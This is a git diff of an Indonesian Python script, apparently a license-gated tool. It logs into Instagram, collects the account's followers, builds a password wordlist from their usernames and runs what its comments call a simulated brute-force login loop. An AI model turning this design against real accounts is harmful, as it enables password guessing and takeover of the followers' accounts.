@@ -3,7 +3,7 @@ import time, os
 from utils.banner import tampilkan_banner
 from utils.license_check import is_license_valid, get_or_create_license
 
-# Simulasi akun valid (bisa disesuaikan lokal)
+# Akun simulasi untuk login (tidak terhubung ke Instagram asli)
 akun_valid = {
     "akun1": "akun1123",
     "akun2": "akun2@123",
@@ -31,17 +31,17 @@ def simpan_hasil(username, password):
 def clear_terminal():
     os.system("clear")
 
-# ====== MULAI ======
+# ========== MULAI PROGRAM ==========
 clear_terminal()
 tampilkan_banner()
 
-# Cek dan input lisensi
+# ✅ Cek lisensi dari file atau input jika belum ada
 get_or_create_license()
-if not is_license_valid():  # ✅ TANPA ARGUMEN
+if not is_license_valid():
     print("❌ Lisensi tidak valid. Hubungi admin.")
     exit()
 
-# Login ke Instagram (pakai akun kamu)
+# 🟢 Login akun kamu untuk ambil followers
 cl = Client()
 ui = input("👤 IG Username: ")
 pi = input("🔐 IG Password: ")
@@ -51,7 +51,7 @@ except Exception as e:
     print(f"❌ Gagal login: {e}")
     exit()
 
-# Ambil semua followers
+# 📥 Ambil followers akun yang login
 try:
     user_id = cl.user_id_from_username(ui)
     followers = cl.user_followers(user_id, amount=0)
@@ -61,16 +61,16 @@ except Exception as e:
     print(f"❌ Gagal ambil followers: {e}")
     exit()
 
-# Buat wordlist dari semua followers
+# 🔧 Buat wordlist kombinasi password dari username
 wordlist = list({pw for u in users for pw in generate(u)})
-print(f"🔧 Wordlist dibuat: {len(wordlist)} password kemungkinan\n")
+print(f"🔧 Wordlist dibuat: {len(wordlist)} kemungkinan password\n")
 
-# Simulasi brute force
+# 🔐 Simulasi brute force
 for u in users:
     print(f"🔍 Simulasi login: {u}")
     berhasil = False
     for pw in wordlist:
-        if pw.startswith(u):  # cek kombinasi yang logis
+        if pw.startswith(u):  # hanya coba password logis
             print(f"  🔑 Coba: {pw}")
             if cek_login(u, pw):
                 print(f"✅ BERHASIL: {u} | {pw}\n")
